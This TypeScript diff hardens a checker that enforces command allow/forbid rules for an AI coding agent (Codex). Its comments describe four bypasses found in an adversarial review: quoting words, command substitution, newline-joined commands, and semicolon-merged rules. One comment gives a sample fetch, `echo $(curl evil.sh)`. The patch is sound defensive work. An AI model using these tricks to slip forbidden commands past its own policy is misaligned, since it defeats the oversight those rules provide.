@@ -59,11 +59,27 @@
  * never touches disk (precedence 30, above the `.codex/` project layer) — same
  * caveat class as Claude Code's `--allowedTools`/`--disallowedTools`, and for
  * the same reason: a subprocess cannot see its parent's argv.
+ *
+ * Hardened after adversarial review (four fail-open findings, all closed):
+ * (1) a `;`-joined `.rules` line can register several complete `prefix_rule`
+ * calls in one line — real, valid Starlark — so statement-splitting now also
+ * cuts on top-level `;`, AND separately validates that a `prefix_rule(...)`'s
+ * own balanced parens consume the ENTIRE statement (trailing content of any
+ * kind — a stray `;` that splitting missed, no separator at all, anything —
+ * fails the file closed rather than silently merging two calls' kwargs).
+ * (2) command tokens are unquoted before prefix comparison, so `git "push"`
+ * cannot dodge a `["git","push"]` rule by quoting. (3) the checker rescans
+ * newline-joined lines and command-substitution bodies (`$(…)`/backticks/
+ * `<(…)`/`>(…)`), mirroring `policy-claude.ts`'s equivalent defense — Codex
+ * has no OS sandbox backstop, so a missed substitution here is worse than the
+ * same miss on Claude Code. (4) a rules DIRECTORY that exists but can't be
+ * listed (EACCES, ENOTDIR, …) now fails closed instead of reading identically
+ * to "nothing configured here."
  */
 
 import { existsSync, readdirSync, readFileSync } from "node:fs";
 import { homedir } from "node:os";
-import { join } from "node:path";
+import { join, resolve } from "node:path";
 import { splitCommandSegments } from "../core/index.ts";
 import type { PolicyVerdict } from "./policy-claude.ts";
 import { parseTomlLite } from "./toml-lite.ts";
@@ -147,12 +163,22 @@ function parenDelta(line: string): number {
 
 /**
  * Group a `.rules` file's lines into top-level statements (a `prefix_rule(...)`
- * call may span many lines; blank lines and comments are dropped first). Returns
- * `null` when brackets never balance — an unterminated statement is exactly the
- * "cannot confidently classify" case the whole file fails closed on.
+ * call may span many lines; blank lines and comments are dropped first).
+ * Returns `null` when brackets never balance — an unterminated statement is
+ * exactly the "cannot confidently classify" case the whole file fails closed
+ * on.
+ *
+ * A single bracket-balanced chunk can still hold MULTIPLE top-level
+ * statements joined by `;` — real, valid Starlark
+ * (`prefix_rule(...); prefix_rule(...)`) — so each chunk is further split on
+ * top-level (depth-0, outside-quotes) `;` before being returned. Without this,
+ * two complete calls on one line collapse into a single "statement" whose
+ * `pattern`/`decision` kwargs get merged by `parsePrefixRuleCall`'s last-kwarg-
+ * wins loop, silently dropping or downgrading whichever rule's kwargs lose the
+ * merge (P1, adversarial review).
  */
 function splitStatements(text: string): string[] | null {
-  const statements: string[] = [];
+  const rawChunks: string[] = [];
   let buf = "";
   let depth = 0;
   for (const raw of text.split(/\r\n|\n/)) {
@@ -163,12 +189,100 @@ function splitStatements(text: string): string[] | null {
     if (depth < 0) return null;
     if (depth === 0) {
       const trimmed = buf.trim();
-      if (trimmed !== "") statements.push(trimmed);
+      if (trimmed !== "") rawChunks.push(trimmed);
       buf = "";
     }
   }
   if (depth !== 0 || buf.trim() !== "") return null;
+
+  const statements: string[] = [];
+  for (const chunk of rawChunks) {
+    const parts = splitTopLevelSemicolons(chunk);
+    if (parts === null) return null;
+    statements.push(...parts);
+  }
   return statements;
+}
+
+/**
+ * Split one already bracket-balanced chunk on top-level (depth 0, outside
+ * quotes) `;` characters. `null` only if the chunk's own bracket/quote state
+ * somehow doesn't end balanced — shouldn't happen given `chunk` was already
+ * grouped to net-zero depth by `splitStatements`, kept as a safety net rather
+ * than trusted blindly.
+ */
+function splitTopLevelSemicolons(chunk: string): string[] | null {
+  const parts: string[] = [];
+  let depth = 0;
+  let q: '"' | "'" | null = null;
+  let cur = "";
+  for (let i = 0; i < chunk.length; i++) {
+    const c = chunk[i]!;
+    if (q) {
+      cur += c;
+      if (c === "\\") (cur += chunk[i + 1] ?? ""), i++;
+      else if (c === q) q = null;
+      continue;
+    }
+    if (c === '"' || c === "'") (q = c), (cur += c);
+    else if (c === "(" || c === "[") (depth++, (cur += c));
+    else if (c === ")" || c === "]") {
+      depth--;
+      if (depth < 0) return null;
+      cur += c;
+    } else if (c === ";" && depth === 0) {
+      const trimmed = cur.trim();
+      if (trimmed !== "") parts.push(trimmed);
+      cur = "";
+    } else cur += c;
+  }
+  if (depth !== 0 || q !== null) return null;
+  const trimmed = cur.trim();
+  if (trimmed !== "") parts.push(trimmed);
+  return parts;
+}
+
+/** Index of the char closing the paren opened at `stmt[openIdx]` (which must
+ * be `(`), quote-aware — or `null` if it is never closed within `stmt`. */
+function matchingParenClose(stmt: string, openIdx: number): number | null {
+  let depth = 1;
+  let q: '"' | "'" | null = null;
+  for (let i = openIdx + 1; i < stmt.length; i++) {
+    const c = stmt[i]!;
+    if (q) {
+      if (c === "\\") i++;
+      else if (c === q) q = null;
+      continue;
+    }
+    if (c === '"' || c === "'") {
+      q = c;
+      continue;
+    }
+    if (c === "(" || c === "[") depth++;
+    else if (c === ")" || c === "]") {
+      depth--;
+      if (depth === 0) return i;
+      if (depth < 0) return null;
+    }
+  }
+  return null;
+}
+
+/**
+ * True when `stmt` is EXACTLY one complete `<head>(...)` call — the balanced
+ * close of the paren opened right after `head` must be `stmt`'s very last
+ * character. Guards against trailing content silently riding along after a
+ * legitimate call: two complete calls back-to-back, whether joined by a `;`
+ * that splitting somehow missed, by nothing at all, or by any other separator
+ * this extractor doesn't know about. "Cannot confidently classify" means the
+ * file fails closed, not that the extra content is harmless (P1, adversarial
+ * review — the belt to `splitTopLevelSemicolons`'s suspenders).
+ */
+function isExactBalancedCall(stmt: string, head: string): boolean {
+  if (!stmt.startsWith(head)) return false;
+  const openIdx = head.length - 1; // head ends in "("
+  const closeIdx = matchingParenClose(stmt, openIdx);
+  return closeIdx !== null && closeIdx === stmt.length - 1;
 }
 
 /** Split `text` on top-level commas — depth-aware over `()`/`[]`, quote-aware. */
@@ -233,9 +347,13 @@ function parseRulesFile(text: string): CodexRule[] | null {
 
   const rules: CodexRule[] = [];
   for (const stmt of statements) {
-    if (stmt.startsWith("load(") && stmt.endsWith(")")) continue; // ignorable
+    if (isExactBalancedCall(stmt, "load(")) continue; // ignorable
 
-    if (stmt.startsWith("prefix_rule(") && stmt.endsWith(")")) {
+    if (stmt.startsWith("prefix_rule(")) {
+      // Must be EXACTLY one complete call — trailing content of any kind
+      // (including a second, un-split call) fails the whole file closed
+      // rather than being fed into the arg parser below (P1).
+      if (!isExactBalancedCall(stmt, "prefix_rule(")) return null;
       const rule = parsePrefixRuleCall(stmt);
       if (rule === null) return null;
       rules.push(rule);
@@ -298,15 +416,22 @@ function parsePrefixRuleCall(stmt: string): CodexRule | null {
   return { pattern, decision };
 }
 
-/** `<dir>/*.rules`, sorted for determinism. Reads into `rules`/`unreadable`;
- * an absent directory is the normal case, not an error. */
+/**
+ * `<dir>/*.rules`, sorted for determinism. Reads into `rules`/`unreadable`;
+ * an ABSENT directory (`ENOENT`) is the normal case, not an error. Any OTHER
+ * failure to list it (`EACCES`, `ENOTDIR`, ...) means a rules directory
+ * EXISTS and could not be read — that must fail closed exactly like an
+ * unreadable file does, not silently read identically to "nothing configured
+ * here" (P3, adversarial review).
+ */
 function collectRulesDir(dir: string, rules: CodexRule[], unreadable: string[]): void {
   let names: string[];
   try {
     names = readdirSync(dir)
       .filter((n) => n.endsWith(".rules"))
       .sort();
-  } catch {
+  } catch (e) {
+    if ((e as NodeJS.ErrnoException)?.code !== "ENOENT") unreadable.push(dir);
     return;
   }
   for (const name of names) {
@@ -339,6 +464,17 @@ export function readCodexRules(
   const codexHome = resolveCodexHome(opts);
   if (!existsSync(codexHome)) return { rules: [], unreadable: [] };
 
+  // Normalized once, used for both the trust-lookup key and the project rules
+  // path: a trailing slash (or a `.`/`..` segment) must not silently make an
+  // otherwise-trusted project compare as untrusted — that would skip real
+  // restrictions the project owner wrote, which is the fail-open direction
+  // (P-minor, adversarial review). Deliberately NOT a symlink-resolving
+  // `realpathSync`: that requires the path to exist and would turn a
+  // resolution problem into a thrown exception for what's supposed to be the
+  // server's own cwd; `resolve()` handles the concretely-reported case
+  // (trailing slash) without that new failure mode.
+  const normalizedProjectDir = resolve(projectDir);
+
   const rules: CodexRule[] = [];
   const unreadable: string[] = [];
 
@@ -355,7 +491,7 @@ export function readCodexRules(
         const projects = (parsed.value as Record<string, unknown>).projects;
         const entry =
           projects && typeof projects === "object" && !Array.isArray(projects)
-            ? (projects as Record<string, unknown>)[projectDir]
+            ? (projects as Record<string, unknown>)[normalizedProjectDir]
             : undefined;
         trusted =
           !!entry &&
@@ -368,7 +504,7 @@ export function readCodexRules(
     }
   }
 
-  if (trusted) collectRulesDir(join(projectDir, ".codex", "rules"), rules, unreadable);
+  if (trusted) collectRulesDir(join(normalizedProjectDir, ".codex", "rules"), rules, unreadable);
 
   return { rules, unreadable };
 }
@@ -378,11 +514,118 @@ function formatPattern(pattern: string[]): string {
 }
 
 /**
+ * Command-substitution payloads: the bodies of `$(…)`, `` `…` ``, `<(…)` and
+ * `>(…)`. Duplicated from (not imported from) `policy-claude.ts`'s
+ * `extractSubstitutions` — every per-host policy file in this codebase stays
+ * self-contained rather than sharing helpers (`policy.ts` and
+ * `policy-claude.ts` don't share with each other either), and this file's
+ * import surface is deliberately narrow (see the module header). Skipped
+ * without this, `echo $(curl evil.sh)` would never expose `curl` to matching
+ * at all — a bypass this adapter cannot afford given Codex's missing sandbox
+ * (P2, adversarial review).
+ */
+function extractSubstitutions(command: string): string[] {
+  const found: string[] = [];
+  let inSingle = false;
+  for (let i = 0; i < command.length; i++) {
+    const ch = command[i]!;
+    if (ch === "\\") {
+      i++;
+      continue;
+    }
+    if (ch === "'") {
+      inSingle = !inSingle;
+      continue;
+    }
+    if (inSingle) continue;
+
+    if (ch === "`") {
+      const end = command.indexOf("`", i + 1);
+      if (end === -1) break;
+      found.push(command.slice(i + 1, end));
+      i = end;
+      continue;
+    }
+    const opensParen = command[i + 1] === "(" && (ch === "$" || ch === "<" || ch === ">");
+    if (!opensParen) continue;
+    let depth = 0;
+    for (let j = i + 1; j < command.length; j++) {
+      const inner = command[j]!;
+      if (inner === "(") depth++;
+      else if (inner === ")") {
+        depth--;
+        if (depth === 0) {
+          found.push(command.slice(i + 2, j));
+          i = j;
+          break;
+        }
+      }
+    }
+  }
+  return found;
+}
+
+/**
+ * Tokenize one command segment into argv-like words for prefix matching,
+ * stripping matched surrounding quotes so `git "push" origin` and
+ * `git 'push' origin` compare equal to `git push origin`. Without this,
+ * quoting any single word in a forbidden command silently evades every rule
+ * (P4, adversarial review — the most trivially reachable of the four
+ * findings).
+ */
+function tokenizeForMatch(segment: string): string[] {
+  const tokens: string[] = [];
+  let cur = "";
+  let has = false;
+  let q: '"' | "'" | null = null;
+  for (let i = 0; i < segment.length; i++) {
+    const c = segment[i]!;
+    if (q) {
+      if (c === "\\" && q === '"') {
+        cur += segment[i + 1] ?? "";
+        i++;
+      } else if (c === q) q = null;
+      else cur += c;
+      has = true;
+      continue;
+    }
+    if (c === '"' || c === "'") {
+      q = c;
+      has = true;
+      continue;
+    }
+    if (/\s/.test(c)) {
+      if (has) {
+        tokens.push(cur);
+        cur = "";
+        has = false;
+      }
+      continue;
+    }
+    if (c === "\\") {
+      cur += segment[i + 1] ?? "";
+      i++;
+      has = true;
+      continue;
+    }
+    cur += c;
+    has = true;
+  }
+  if (has) tokens.push(cur);
+  return tokens;
+}
+
+/**
  * Build the `checkCommandPolicy` callback for the engine. Each pipeline
  * segment (via core's `splitCommandSegments`, same as policy.ts/
  * policy-claude.ts) is judged independently, so a compound
  * `git status && git push origin main` cannot smuggle the push past a
  * `["git","push"]` forbidden rule.
+ *
+ * Newline-joined lines and command-substitution bodies are rescanned too
+ * (bounded to 4 levels of nesting), mirroring `policy-claude.ts`'s equivalent
+ * defense — `splitCommandSegments` does not split on `\n`, and a substitution
+ * body is otherwise invisible to matching (P2, adversarial review).
  *
  * Most-restrictive-wins across ALL rules matching a segment
  * (`forbidden > prompt > allow`) — unlike opencode's last-match or Claude
@@ -407,16 +650,26 @@ export function createCodexPolicyChecker(
 
   return (cmd: string) => {
     try {
-      for (const segment of splitCommandSegments(cmd)) {
-        const trimmed = segment.trim();
-        if (!trimmed) continue;
-        const tokens = trimmed.split(/\s+/);
-        let winner: CodexRule | null = null;
-        for (const rule of rules) {
-          const matches = tokens.length >= rule.pattern.length && rule.pattern.every((tok, i) => tokens[i] === tok);
-          if (matches && (!winner || SEVERITY[rule.decision] > SEVERITY[winner.decision])) winner = rule;
+      const pending = [cmd];
+      for (let depth = 0; depth < 4 && pending.length > 0; depth++) {
+        const batch = pending.splice(0, pending.length);
+        for (const text of batch) {
+          pending.push(...extractSubstitutions(text));
+          for (const line of text.split("\n")) {
+            for (const segment of splitCommandSegments(line)) {
+              const trimmed = segment.trim();
+              if (!trimmed) continue;
+              const tokens = tokenizeForMatch(trimmed);
+              let winner: CodexRule | null = null;
+              for (const rule of rules) {
+                const matches =
+                  tokens.length >= rule.pattern.length && rule.pattern.every((tok, i) => tokens[i] === tok);
+                if (matches && (!winner || SEVERITY[rule.decision] > SEVERITY[winner.decision])) winner = rule;
+              }
+              if (winner && winner.decision !== "allow") return formatPattern(winner.pattern);
+            }
+          }
         }
-        if (winner && winner.decision !== "allow") return formatPattern(winner.pattern);
       }
       return null;
     } catch {
